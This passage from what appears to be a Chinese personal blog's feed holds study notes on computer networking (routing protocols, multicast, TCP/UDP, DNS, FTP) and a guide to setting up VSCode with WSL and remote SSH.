alt="image-20240309013653735"></p><p>与x相邻的路由为R1，x就把自己的上图路由表发给R1，原来的路由表表示，到Net3网络的最短路径为2跳，下一跳为R2，R1收到后就直接顺着修改成到Net3的最短路径为3，下一跳为x</p></li><li><p>对修改后的RIP报文中的每一个项目，进行以下步骤：</p><ul><li><p>R1路由表中若没有Net3，则把该项目填入R1路由表。</p></li><li><p>R1路由表中若有Net3，则查看下一跳路由器地址：</p><p>若下一跳是X不管距离大小，则用收到的项目替换源路由表中的项目；</p><p>若下一跳不是X，比较原来距离比从X走的距离远则更新，否则不作处理。</p></li></ul></li><li><p>若180s还没收到相邻路由器X的更新路由表，则把X记为不可达的路由器，即把距离设置为16。</p></li><li><p>返回。</p></li></ol><h2><span id="rip协议报文格式">RIP协议报文格式</span></h2><p><img src="http://cdn.clown2024.cn/202407151707740.png" alt="image-20240309015032452"></p><h2><span id="rip特点">RIP特点</span></h2><p><img src="C:/Users/86189/AppData/Roaming/Typora/typora-user-images/image-20240309015302320.png" alt="image-20240309015302320"></p><p>要不断重复更新下去，直到双方路由表到网1的距离都更新到16，R1和R2才知道网络1是不可达的。</p><h1><span id="ospf协议">OSPF协议</span></h1><p><strong>定义</strong><br>开放最短路径优先OSPF协议:“开放”标明OSPF协议不是受某一家厂商控制，而是公开发表的：”最短路径优先“是因为使用了Diikstra提出的最短路径算法SPF。</p><p>OSPF最主要的特征就是使用分布式的链路状态协议。</p><p><strong>OSPF的特点</strong></p><ol><li>使用洪泛法向自治系统内所有路由器发送信息，即路由器通过输出端口向所有相邻的路由器发送信息，而每一个相邻路由器又再次将此信息发往其所有的相邻路由器；就相当于广播信息出去。最终整个区域内的路由器就得到了这个信息的一个副本。</li><li>发送的信息就是与本路由器相邻的所有路由器的链路状态(本路由器和哪些路由器相邻，以及该链路的度<br>量&#x2F;代价–费用、距离、时延、带宽等)。</li><li>只有当链路状态发生变化时，路由器才向所有路由器洪泛发送此信息。</li></ol><blockquote><p>最后，所有路由器都能建立一个链路状态数据库，即全网拓扑图。</p></blockquote><h2><span id="链路状态路由算法">链路状态路由算法</span></h2><p><img src="http://cdn.clown2024.cn/202407151707741.png" alt="image-20240309093424516"></p><h2><span id="ospf的区域">OSPF的区域</span></h2><p> OSPF常用于规模很大的网络，OSPF将一个自治系统再划分为若干个更小的范围，叫做区域；每一个区域都有一个32位的区域标识符(用点分十进制表示)，区域也不能太大，在一个区域内的路由器最好不超过200个。</p><p><img src="http://cdn.clown2024.cn/202407151707742.png" alt="image-20240309093653477"></p><blockquote><p>位于主干边界的路由器，比如R3，R4，R7；既属于主干路由器也属于区域边界路由器</p><p>自治系统边界路由器就是与外界连接比如其他AS的路由器。</p></blockquote><h2><span id="ospf分组">OSPF分组</span></h2><p><img src="http://cdn.clown2024.cn/202407151707743.png" alt="image-20240309094030723"></p><blockquote><p>关于OSPF属于哪一层协议有点争议，判断某个协议属于哪一层：一个协议的实现需要依赖协议所在层次的下一层功能；所以RIP依赖UDP所以是应用层协议。</p><p>而OSPF依赖网络层，属于传输层协议；但是在考研的考纲中，OSPF是不使用UDP数据报传送，而是直接使用IP数据报传送，所以被划分到网络层协议。</p></blockquote><h2><span id="其他特点">其他特点</span></h2><p><img src="http://cdn.clown2024.cn/202407151707744.png" alt="image-20240309095051174"></p><h1><span id="bgp协议">BGP协议</span></h1><p><strong>交换信息的特点</strong></p><ul><li>与其他AS的邻站BGP发言人交换信息。</li><li>交换的网络可达性的信息，即要到达某个网络所要经过的一系列AS。</li><li>发生变化时更新有变化的部分。</li></ul><p><img src="http://cdn.clown2024.cn/202407151707745.png" alt="image-20240309095348561"></p><blockquote><p>发言人也不一定要是边界路由器，可以自己设定。</p><p>BGP协议交换内容首次为整个路由表，后面则为有变化的部分。</p></blockquote><h2><span id="bgp交换信息过程">BGP交换信息过程</span></h2><p>BGP 所交换的网络可达性的信息就是要到达某个网络所要经过的一系列 AS。当 BGP 发言人互相交换了网络可<br>性的信息后，各 BGP发言人就根据所采用的策略从收到的路由信息中找出到达各 AS的较好路由。</p><ul><li><p>BGP发言人交换路径向量：</p><p><img src="http://cdn.clown2024.cn/202407151707746.png" alt="image-20240309095956540"></p><p>主干网还可发出通知：要到达网络N5、N6和N7可沿路径(AS1,AS3)。</p></li></ul><h2><span id="bgp协议报文格式">BGP协议报文格式</span></h2><p>一个BGP 发言人与其他自治系统中的 BGP 发言人要交换路由信息，就要先建立 TCP 连接，即通过TCP传送，然后在此连接上交换 BGP 报文以建立 BGP 会话(session)，利用 BGP 会话交换路由信息。</p><p><img src="http://cdn.clown2024.cn/202407151707747.png" alt="image-20240309100149532"></p><h2><span id="bgp协议特点">BGP协议特点</span></h2><p>BGP 支持 CIDR，因此 BGP 的路由表也就应当包括目的网络前缀、下一跳路由器，以及到达该目的网络所要经过的各个自治系统序列。</p><p>在 BGP 刚刚运行时，BGP的邻站是交换整个的 BGP路由表。但以后只需要在发生变化时更新有变化的部分。这样做对节省网络带宽和减少路由器的处理开销都有好处。</p><h2><span id="bgp-4的四种报文">BGP-4的四种报文</span></h2><ol><li><p><strong>OPEN(打开)报文：</strong>用来与相邻的另一个BGP发言人建立关系，并认证发送方。</p></li><li><p><strong>UPDATE(更新)报文：</strong>通告新路径或撤销原路径。</p></li><li><p><strong>KEEPALIVE(保活)报文：</strong>在无UPDATE时，周期性证实邻站的连通性；也作为OPEN的确认。</p></li><li><p><strong>NOTIFICATION(通知)报文：</strong>报告先前报文的差错;也被用于关闭连接。</p></li></ol><h1><span id="三种路由协议的比较">三种路由协议的比较</span></h1><p><img src="http://cdn.clown2024.cn/202407151707748.png" alt="image-20240309100705696"></p><h1><span id="ip组播">IP组播</span></h1><h2><span id="ip数据报的三种传输方式">IP数据报的三种传输方式</span></h2><ol><li><strong>单播：</strong>单播用于发送数据包到单个目的地，且每发送一份单播报文都使用一个单播IP地址作为目的地址。是一种点对点传输方式。</li><li><strong>广播：</strong>广播是指发送数据包到同一广播域或子网内的所有设备的一种数据传输方式，是一种点对多点传输方式。</li><li><strong>组播(多播)：</strong>当网络中的某些用户需要特定数据时，组播数据发送者仅发送一次数据，借助组播路由协议为组播数据包建立组播分发树，被传递的数据到达距离用户端尽可能近的节点后才开始复制和分发，是一种点对多点传输方式。</li></ol><p>组播提高了数据传送效率。减少了主干网出现拥塞的可能性。组播组中的主机可以是在同一个物理网络，也可以来自不同的物理网络(如果有组播路由器的支持也就是运行组播协议的路由器)。</p><p>以一个发送视频数据的图例来解释：</p><p><img src="http://cdn.clown2024.cn/202407151707749.png" alt="image-20240309101432054"></p><p>组播在每条链路上只有一份数据，大大降低网络拥塞的可能；如果是单播传输的话，服务器就要复制90份数据然后进行分发，链路上就会出现90份数据，网络拥塞程度就会上升。</p><p><img src="http://cdn.clown2024.cn/202407151707750.png" alt="image-20240309101706544"></p><h2><span id="ip组播地址">IP组播地址</span></h2><p>IP组播地址让源设备能够将分组发送给一组设备。属于多播组的设备将被分配一个组播组IP地址(一群共同需求<br>主机的相同标识)。</p><p>组播地址范围为224.0.0.0~239.255.255.255(D类地址)，一个D类地址表示一个组播组。组播地址只能用作分组的目标地址。源地址总是为单播地址。</p><p><strong>组播数据报特点</strong></p><ol><li><p>组播数据报也是“尽最大努力交付”，不提供可靠交付，应用于UDP</p></li><li><p>对组播数据报不产生ICMP差错报文。</p></li><li><p>并非所有D类地址都可以作为组播地址。</p></li></ol><h2><span id="硬件组播">硬件组播</span></h2><p>在上面的视频传输的例子中，又有<strong>因特网范围内组播</strong>和<strong>硬件组播</strong>。</p><p>硬件组播是在局域网内进行组播；因特网组播则是还未进入局域网时组播。</p><p><img src="http://cdn.clown2024.cn/202407151707751.png" alt="image-20240309103003239"></p><h2><span id="igmp协议与组播路由选择协议">IGMP协议与组播路由选择协议</span></h2><h3><span id="igmp协议">IGMP协议</span></h3><p>也叫网际组管理协议</p><p><strong>IGMP协议工作的两个阶段</strong></p><ol><li><p>某主机要加入组播组时，该主机向组播组的组播地址发送一个IGMP报文，声明自己要称为该组的成员。本地组播路由器收到IGMP报文后，要利用组播路由选择协议把这组成员关系发给因特网上的其他组播路由器。</p></li><li><p>本地组播路由器周期性探询本地局域网上的主机，以便知道这些主机是否还是组播组的成员。</p><p>只要有一个主机对某个组响应，那么组播路由器就认为这个组是活跃的；如果经过几次探询后没有一个主机响应，组播路由器就认为本网络上的没有此组播组的主机，因此就不再把这组的成员关系发给其他的组播路由器。</p></li></ol><blockquote><p>组播路由器知道的成员关系只是所连接的局域网中有无组播组的成员。</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151707752.png" alt="image-20240309103754389"></p><h3><span id="组播路由选择协议">组播路由选择协议</span></h3><p>组播路由选择协议目的是找出以源主机为根节点的组播转发树。</p><p>对不同的多播组对应于不同的多播转发树；同一个多播组，对不同的源点也会有不同的多播转发树。</p><p><img src="http://cdn.clown2024.cn/202407151707753.png" alt="image-20240309104118961"></p><p><strong>常用的三种算法</strong></p><ol><li><p>基于链路状态的路由选择</p></li><li><p>基于距离-向量的路由选择</p></li><li><p>协议无关的组播(稀疏&#x2F;密集)</p><p>组播组中的主机比较分散就用稀疏算法；较为密集就用密集算法。</p></li></ol><blockquote><p>第一第二种都在前面有说过。</p></blockquote><h1><span id="移动ip">移动IP</span></h1><h2><span id="相关概念">相关概念</span></h2><p>移动IP技术是移动结点(计算机&#x2F;服务器等)以固定的网络IP地址，实现跨越不同网段的漫游功能，并保证了基于网络IP的网络权限在漫游过程中不发生任何改变。</p><p><strong>移动结点</strong> 具有永久IP地址的移动设备。</p><p><strong>归属代理(本地代理)</strong> 一个移动结点的永久“居所”称为归属网络，在归属网络中代表移动节点执行移动管理功能的实体叫做归属代理。</p><p><strong>永久地址(归属地址&#x2F;主地址)</strong> 移动站点在归属网络中的原始地址。</p><p><strong>外部代理(外地代理)</strong> 在外部网络中帮助移动节点完成移动管理功能的实体称为外部代理。</p><p><strong>转交地址(辅地址)</strong> 可以是外部代理的地址或动态配置的一个地址。</p><h2><span id="移动ip通信过程">移动IP通信过程</span></h2><p><img src="http://cdn.clown2024.cn/202407151707754.png" alt="image-20240309105307481"></p><h1><span id="网络层设备">网络层设备</span></h1><h2><span id="路由器">路由器</span></h2><p>路由器是一种具有多个输入端口和输出端口的专用计算机，其任务是转发分组。</p><p><img src="http://cdn.clown2024.cn/202407151707755.png" alt="image-20240309105633658"></p><p><strong>输入端口的处理</strong></p><p><img src="http://cdn.clown2024.cn/202407151707756.png" alt="image-20240309105754630"></p><p><strong>输出端口</strong></p><p><img src="http://cdn.clown2024.cn/202407151707757.png" alt="image-20240309105909980"></p><h2><span id="三层设备的区别">三层设备的区别</span></h2><p><strong>路由器</strong> 可以互联两个不同网络层协议的网段。</p><p><strong>网桥</strong> 可以互联两个物理层和链路层不同的网段。</p><p><strong>集线器</strong> 不能互联两个物理层不同的网段</p><p><img src="http://cdn.clown2024.cn/202407151707758.png" alt="image-20240309110212888"></p><h2><span id="路由表与路由转发">路由表与路由转发</span></h2><p>路由表根据路由选择算法得出的，主要用途是路由选择，总用软件来实现</p><p><img src="http://cdn.clown2024.cn/202407151707759.png" alt="image-20240309110538681"></p>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vscode配置Linux开发环境</title>
      <link href="/2024/03/06/vscode%E9%85%8D%E7%BD%AELinux%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/"/>
      <url>/2024/03/06/vscode%E9%85%8D%E7%BD%AELinux%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<h1><span id="vscode配置wsl开发环境">VSCode配置wsl开发环境</span></h1><p>在vscode上使用wsl进行开发环境就比较简单，我这里用的是Ubuntu的wsl</p><p>首先检查一下wsl里面有没有gcc和g++编译器</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">g++ -v<br>gcc -v<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444002.png" alt="image-20240306164855577"></p><p><img src="http://cdn.clown2024.cn/202407151444003.png" alt="image-20240306164915530"></p><p>如果没有就执行下面命令安装</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sudo apt-get update #更新软件包列表<br>sudo apt-get install build-essential gdb #安装 GNU 编译器工具和 GDB 调试器<br></code></pre></td></tr></table></figure><p>然后去创建一个项目文件夹，在需要vscode打开的文件夹下输入</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">code .<br></code></pre></td></tr></table></figure><p>就会自动开启一个vscode</p><p><img src="http://cdn.clown2024.cn/202407151444004.png" alt="image-20240306165346221"></p><p>左下角就会显示wsl的连接</p><p><img src="http://cdn.clown2024.cn/202407151444005.png" alt="image-20240306165411416"></p><p>随便写个cpp文件，然后我们在终端就可以进行编译了</p><p><img src="http://cdn.clown2024.cn/202407151444006.png" alt="image-20240306165629607"></p><p><strong>从vscode中启动wsl</strong></p><p>只需要安装两个remote扩展就可以了</p><p><img src="http://cdn.clown2024.cn/202407151444007.png" alt="image-20240306170459303"></p><p><img src="http://cdn.clown2024.cn/202407151444008.png" alt="image-20240306170511786"></p><p>然后命令输入wsl即可连接</p><p><img src="http://cdn.clown2024.cn/202407151444009.png" alt="image-20240306170442810"></p><p>如果有多个发行版想要指定的话就选这个</p><p><img src="http://cdn.clown2024.cn/202407151444010.png" alt="image-20240306170834830"></p><blockquote><p>另外不想命令行编译调试的话也可以直接在为wsl安装code runner和c++扩展即可</p></blockquote><h1><span id="vscode配置远程服务器连接">VSCode配置远程服务器连接</span></h1><p>首先安装好这个插件</p><p><img src="http://cdn.clown2024.cn/202407151444011.png" alt="image-20240306205105832"></p><p>然后去config文件配置ssh文件</p><p><img src="http://cdn.clown2024.cn/202407151444012.png" alt="image-20240306205237737"></p><p>要先在本机使用如下命令生成密钥</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ssh-keygen -t rsa  //一般默认保存在~/.ssh路径下<br></code></pre></td></tr></table></figure><p>然后配置文件如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Host &lt;随便填主机名&gt;<br>HostName &lt;远程主机ip地址&gt;<br>User &lt;登陆用户&gt;<br>IdentityFile &lt;私钥路径&gt;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444013.png" alt="image-20240306205426338"></p><p>配置好本机ssh文件之后，公钥放在远程主机的~&#x2F;.ssh下</p><p><img src="http://cdn.clown2024.cn/202407151444014.png" alt="image-20240306205744858"></p><p>然后把公钥文件写入authorized_keys里即可完成整个配置</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cat id_rsa_vps.pub &gt;&gt; authorized_keys<br></code></pre></td></tr></table></figure><blockquote><p>公钥私钥是用来进行免密登陆的，也可以不使用，只不过在登陆的时候就要输入密码</p></blockquote><p>然后点击在新窗口连接主机</p><p><img src="http://cdn.clown2024.cn/202407151444015.png" alt="image-20240306210558090"></p><p>成功！其余的开发配置就和上面的wsl配置没什么区别了，就懒得整了</p>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c/c++ 环境配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络学习-3</title>
      <link href="/2024/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0-3/"/>
      <url>/2024/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0-3/</url>
      
        <content type="html"><![CDATA[<h1><span id="传输层概述">传输层概述</span></h1><p>传输层学习两种协议，TCP和UDP协议</p><p><img src="http://cdn.clown2024.cn/202407151537875.png" alt="image-20240305182817812"></p><p><strong>TCP协议的作用：</strong></p><ul><li>可靠传输</li><li>流量控制</li><li>拥塞控制</li></ul><p>传输层是只有主机才有的层次，传输层可以为应用层提供服务，也可以使用网络层的服务</p><p>传输层的功能：</p><ul><li>传输层提供进程和进程之间的逻辑通信。网络层则提供主机之间的逻辑通信。</li><li>复用和分用。</li><li>传输层对收到的报文进行差错检测</li><li>传输层有两种协议</li></ul><h1><span id="传输层的寻址与端口">传输层的寻址与端口</span></h1><p><strong>复用</strong>：应用层所有的应用进程都可以通过传输层再传输到网络层。</p><p><strong>分用</strong>：传输层从网络层收到数据后交付指明的应用进程。</p><p>端口号标识主机中的应用进程。</p><p>端口号长度为16bit，所以能表示的端口号数量为65535个。</p><p><strong>端口号的分类：</strong></p><p><img src="http://cdn.clown2024.cn/202407151537876.png" alt="image-20240305183319948"></p><p>所以有些程序都会有默认端口号，比如HTTP的80端口，HTTPS的443端口，这里列举出一些协议的端口号：</p><p><img src="http://cdn.clown2024.cn/202407151537877.png" alt="image-20240305183457929"></p><blockquote><p> 在网络中采用发送方和接收方的套接字组合来识别端点，套接字唯一标识了网络中的一个主机和它上面的一个进程。</p><p>套接字socket&#x3D;(主机IP地址，端口号)</p></blockquote><h1><span id="udp协议">UDP协议</span></h1><p>UDP只在IP数据报服务之上增加了很少功能，即复用分用和差错检测功能。</p><h2><span id="udp的主要特点">UDP的主要特点</span></h2><ol><li><p>UDP是无连接的，减少开销和发送数据之前的时延。</p></li><li><p>UDP使用最大努力交付，即不保证可靠交付。</p></li><li><p>UDP是面向报文的，适合一次性传输少量数据的网络应用。</p></li><li><p>UDP无拥塞控制，适合很多实时应用，比如一些实时视频之类的，丢失了少量数据也是允许的。</p></li><li><p>UDP首部开销小，8B(字节)，TCP20B(字节)</p></li></ol><p><img src="http://cdn.clown2024.cn/202407151537878.png" alt="image-20240305215954723"></p><h2><span id="udp首部格式">UDP首部格式</span></h2><p><img src="http://cdn.clown2024.cn/202407151537879.png" alt="image-20240305220132283"></p><h2><span id="udp校验过程">UDP校验过程</span></h2><p><img src="http://cdn.clown2024.cn/202407151537880.png" alt="image-20240305220303149"></p><p><strong>伪首部校验</strong></p><p><img src="http://cdn.clown2024.cn/202407151537881.png" alt="image-20240305220730662"></p><h1><span id="tcp协议">TCP协议</span></h1><h2><span id="tcp协议的特点">TCP协议的特点</span></h2><p><img src="http://cdn.clown2024.cn/202407151537882.png" alt="image-20240305221800753"></p><p>发送数据时，先把一定的字节放入缓存中，然后取一些字节组成报文段然后带上TCP头部组成完整报文段</p><p><img src="http://cdn.clown2024.cn/202407151537883.png" alt="image-20240305222029888"></p><blockquote><p>字节数不是固定的</p></blockquote><h2><span id="tcp报文段首部格式">TCP报文段首部格式</span></h2><p><img src="http://cdn.clown2024.cn/202407151537884.png" alt="image-20240305222924879"></p><p><strong>下面是各个部分的作用：</strong></p><ul><li><p>序号:在一个TCP连接中传送的字节流中的每一个字节都按顺序编号，本字段表示本报文段所发送数据的第一个字节的序号。</p></li><li><p>确认号:期望收到对方下一个报文段的第一个数据字节的序号。若确认号为N,则证明到序号N-1为止的所有数据都已正确收到。</p></li><li><p>数据偏移(首部长度):TCP报文段的数据起始处距离TCP报文段的起始处有多远以4B位单位，即1个数值是4B。</p></li><li><p>窗口:指的是发送本报文段的一方的接收窗口，即现在允许对方发送的数据量。</p></li><li><p>检验和:检验首部+数据，检验时要加上12B伪首部，第四个字段为6。</p></li><li><p>紧急指针:URG&#x3D;1时才有意义，指出本报文段中紧急数据的字节数</p></li><li><p>选项:最大报文段长度MSS、窗口扩大、时间戳、选择确认…</p></li><li><p>填充:即将报文首部填充至4B的整数倍</p></li></ul><p><strong>6个控制位</strong></p><ul><li><p>紧急位URG：URG&#x3D;1时，标明此报文段中有紧急数据，是高优先级的数据，应尽快传送，不用在缓存里排队，配合紧急指针字段使用。</p></li><li><p>确认位ACK：ACK&#x3D;1时确认号有效，在连接建立后所有传送的报文段都必须把ACK置为1。</p></li><li><p>推送位PSH：PSH&#x3D;1时，接收方尽快交付接收应用进程，不再等到缓存填满再向上交付。</p></li><li><p>复位RST：RST&#x3D;1时，表明TCP连接中出现严重差错，必须释放连接，然后再重新建立传输链接。</p></li><li><p>同步位SYN：SYN&#x3D;1时，表明是一个连接请求&#x2F;连接接受报文。</p></li><li><p>终止位FIN：FIN&#x3D;1时，表明此报文段发送方数据已发完，要求释放连接。</p></li></ul><h1><span id="tcp连接管理">TCP连接管理</span></h1><p>TCP连接传输的三个阶段：</p><p>连接建立&#x3D;》数据传输&#x3D;》连接释放</p><h2><span id="tcp连接建立">TCP连接建立</span></h2><p>采用三次握手建立TCP连接</p><p><img src="http://cdn.clown2024.cn/202407151537885.png" alt="image-20240305225606569"></p><blockquote><p>seq是序号，ack是确认号</p></blockquote><h2><span id="syn洪泛攻击">SYN洪泛攻击</span></h2><p>SYN洪泛攻击发生在OSI第四层，这种方式利用TCP协议的特性，就是三次握手。攻击者发送TCP SYN，SYN是TCP三次握手中的第一个数据包，而当服务器返回ACK后，该攻击者就不对其进行再确认，那这个TCP连接就处于挂起状态，也就是所谓的半连接状态，服务器收不到再确认的话，还会重复发送ACK给攻击者。这样更加会浪费服务器的资源。攻击者就对服务器发送非常大量的这种TCP连接，由于每一个都没法完成三次握手，所以在服务器上，这些TCP连接会因为挂起状态而消耗CPU和内存，最后服务器可能死机，就无法为正常用户提供服务了。</p><p><strong>防范SYN洪泛攻击的方法</strong></p><p>可以通过设置SYN cookie</p><h2><span id="tcp的连接释放">TCP的连接释放</span></h2><p>采用四次握手</p><p><img src="http://cdn.clown2024.cn/202407151537886.png" alt="image-20240305230921528"></p><blockquote><p>等待2MSL的目的是为了能够彻底关闭连接</p><p>因为若B没有收到确认报文段会在2MSL内重新发送第三个报文段，若A直接关闭了就会收不到重传的报文段，B就会一直重传导致连接无法完全关闭</p></blockquote><h1><span id="tcp可靠传输">TCP可靠传输</span></h1><p>可靠传输就是保证接收方进程从缓存区读出的字节流与发送方发出的字节流是完全一样的。</p><p>实现可靠传输的机制：</p><ol><li><p><strong>校验</strong></p><p>增加伪首部与UDP校验一样，</p></li><li><p><strong>序号</strong></p><p>一个字节占一个序号；序号字段指的是一个报文的第一个字节的序号</p><p>一个报文段的字节数取决于MTU(链路层的最大传输单元)</p></li><li><p><strong>确认</strong></p><p><img src="http://cdn.clown2024.cn/202407151537887.png" alt="image-20240306003306167"></p><p>这里发送方要在收到确认报文段之后才会将报文段从缓存中删去，因为可能需要重传。</p><p>如果456和78一起发送过去，只收到了78，接受方就会返回ack为4的报文段，发送方就会重传456报文段，如下图：</p><p><img src="http://cdn.clown2024.cn/202407151537888.png" alt="image-20240306003639763"></p></li><li><p><strong>重传</strong></p><p>TCP的发送方在规定时间内没有收到确认报文段就要重传已发送的报文段；也就是超时重传</p><p>重传时间的设置就采用了自适应算法，动态改变重传时间RTTs(加权平均往返时间)</p><p>不过等待时间过久，还有一种冗余ACK(冗余确认)方法来提高效率</p><p><img src="http://cdn.clown2024.cn/202407151537889.png" alt="image-20240306004112025"></p></li></ol><h1><span id="tcp流量控制">TCP流量控制</span></h1><p>流量控制：也就是控制发送速率，使接收方能够完全接收数据</p><p>TCP采用滑动窗口机制实现流量控制</p><p>在通信过程中，接收方根据自己接收缓存的大小，动态地调整发送方的发送窗口大小，即接收窗口rwnd(接收方设置确认报文段的窗口字段来将rwnd通知给发送方)，发送方的发送窗口取接收窗口rwnd和拥塞窗口cwnd的最小值。</p><p><img src="http://cdn.clown2024.cn/202407151537890.png" alt="image-20240306132247748"></p><h1><span id="tcp拥塞控制">TCP拥塞控制</span></h1><p>出现拥塞的条件：对资源需求总和&gt;可用资源</p><p>拥塞控制就是防止过多的数据注入到网络中。(全局性控制)</p><p>拥塞控制还有四种算法：满开始、拥塞避免、快重传、快恢复</p><p><strong>现在先假定一下情况来学习这四种算法：</strong></p><ol><li><p>数据单方向传送，而另一个方向只传送确认(就是没有捎带确认，也就是附加数据)</p></li><li><p>接收方总是有足够大的缓存空间，因而发送窗口大小取决于拥塞程度</p><p>发送窗口&#x3D;Min{接收窗口rwnd，拥塞窗口cwnd}</p><p>接收窗口：接收方根据接受缓存设置的值，并告知给发送方，反映接收方容量。<br>拥塞窗口：发送方根据自己估算的网络拥塞程度而设置的窗口值，反映网络当前容量。</p></li></ol><h2><span id="慢开始和拥塞避免">慢开始和拥塞避免</span></h2><p><img src="http://cdn.clown2024.cn/202407151537891.png" alt="image-20240306134517263"></p><p>慢开始就是逐渐增加注入的报文段，在达到sshresh(慢开始门限)之前以2的指数倍上升，第一次传输1，第二次则2，第三次则4，以此类推，这里在收到确认报文段之后就会立刻改变拥塞窗口大小；到达门限之后就线性增长，这里的图就逐次加一。</p><p>检测到网络拥塞之后，cwnd(拥塞窗口)就直接降到一，然后重复前面的过程，但是唯一改变的就是sshresh，是在检测到网络拥塞时，将拥塞窗口除以2作为新的sshresh</p><h2><span id="快重传和快恢复">快重传和快恢复</span></h2><p><img src="http://cdn.clown2024.cn/202407151537892.png" alt="image-20240306134721633"></p><p>快重传就是上面说到的冗余ACK，收到三个重复的确认之后就会执行快重传。</p><p>快重传之后执行的就是快恢复，快恢复不会立刻降到拥塞窗口为1，而是降到新的门限值，门限值的大小就是检测到三个重复确认时的拥塞窗口除以2.</p>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络学习-2</title>
      <link href="/2024/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0-2/"/>
      <url>/2024/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0-2/</url>
      
        <content type="html"><![CDATA[<h1><span id="应用层">应用层</span></h1><p>应用层对应用程序的通信提供服务。</p><p><strong>应用层协议定义:</strong></p><ul><li><p>应用进程交换的报文类型，请求还是响应?</p></li><li><p>各种报文类型的语法，如报文中的各个字段及其详细描述字段的语义，即包含在字段中的信息的含义。</p></li><li><p>进程何时、如何发送报文，以及对报文进行响应的规则。</p></li></ul><p><strong>应用层的功能：</strong></p><ul><li><p>文件传输、访问和管理    </p></li><li><p>电子邮件      </p></li><li><p>虚拟终端     </p></li><li><p>查询服务和远程作业登录</p></li></ul><p><strong>应用层重要协议</strong></p><p> <strong>FTP</strong>，<strong>SMTP、POP3</strong>， <strong>HTTP</strong>， <strong>DNS</strong></p><p><strong>网络应用模型</strong></p><ul><li>客户&#x2F;服务器模型（C&#x2F;S）</li><li>P2P模型（Peer-to-peer）也叫对等模型</li></ul><h1><span id="dns系统">DNS系统</span></h1><h2><span id="域名">域名</span></h2><p>域名从左到右级别逐渐升高，最右边的叫做顶级域名</p><p><img src="http://cdn.clown2024.cn/202407151536588.png" alt="image-20240305091606492"></p><p><strong>根</strong></p><p>根指的是顶级域名右边的一点，所以完整的域名写法应该是<a href="http://www.xxx.com.,从根后面才是顶级域名/">www.xxx.com.，从根后面才是顶级域名</a></p><p><strong>顶级域名</strong></p><p><img src="http://cdn.clown2024.cn/202407151536590.png" alt="image-20240305091738436"></p><p>反向域名即通过IP地址来反向解析出域名</p><p><strong>二级域名</strong></p><p><img src="http://cdn.clown2024.cn/202407151536591.png" alt="image-20240305091920777"></p><p><strong>域名树</strong></p><p>域名可以有很多级，比如学校的域名就有三级、四级等等</p><p><img src="http://cdn.clown2024.cn/202407151536592.png" alt="image-20240305092053637"></p><h2><span id="域名服务器">域名服务器</span></h2><ul><li><p>本地域名服务器：当一个主机发出DNS查询请求时，这个查询请求报文就发给本地域名服务器。</p></li><li><p>根域名服务器：知道所有的域名，就是知道顶级域名对应那个顶级域名服务器，在本地域名服务器找不到域名时就会先去请求根域名服务器</p></li><li><p>顶级域名服务器：管理该顶级域名服务器注册的所有二级域名</p></li><li><p>权限域名服务器：负责一个区的域名服务器</p></li></ul><p>总之就是向DNS请求来指明下一步要查询哪一个DNS服务器，这是一个示例图：</p><p><img src="http://cdn.clown2024.cn/202407151536593.png" alt="image-20240305093038757"></p><h2><span id="域名解析过程">域名解析过程</span></h2><p>可以参考这篇文章：<a href="https://blog.csdn.net/m0_37263637/article/details/85157611">域名分级与域名解析过程(DNS)-CSDN博客</a></p><p>域名解析分为两种查询：</p><ul><li><p>递归查询</p><p><img src="http://cdn.clown2024.cn/202407151536594.png" alt="image-20240305093323157"></p></li><li><p>迭代查询</p><p><img src="http://cdn.clown2024.cn/202407151536595.png" alt="image-20240305093347626"></p></li></ul><p>这两种查询的区别就是客户角色不同，递归是每一种服务器都要做查询用户，而迭代就一直是本地域名服务器做查询用户</p><h2><span id="高速缓存">高速缓存</span></h2><p>这是为了提高DNS查询效率的方法，比如最近查询过的域名会存放在本地域名服务器</p><h1><span id="文件传送协议">文件传送协议</span></h1><ul><li>文件传送协议FTP(FileTransfer Protocol)：提供不同种类主机系统(硬、软件体系等都可以不同)之间的文件传输能力。</li><li>简单文件传送协议TFTP(Trivial File Transfer Protocol)</li></ul><h2><span id="ftp服务端和用户端">FTP服务端和用户端</span></h2><blockquote><p> FTP是基于客户&#x2F;服务器(C&#x2F;S)的协议。</p><p>用户通过一个客户机程序连接至在远程计算机上运行的服务器程序。</p><p>依照 FTP协议提供服务，进行文件传送的计算机就是FTP服务器。</p><p>连接FTP服务器，遵循FTP协议与服务器传送文件的电脑就是FTP客户端</p></blockquote><h2><span id="ftp工作原理">FTP工作原理</span></h2><ul><li><p>登陆</p><p>知道ftp服务器地址后有两种登陆方式，一种是用户名&amp;密码登陆方式，另一种是匿名登陆</p><blockquote><p>互连网中有很大一部分FTP 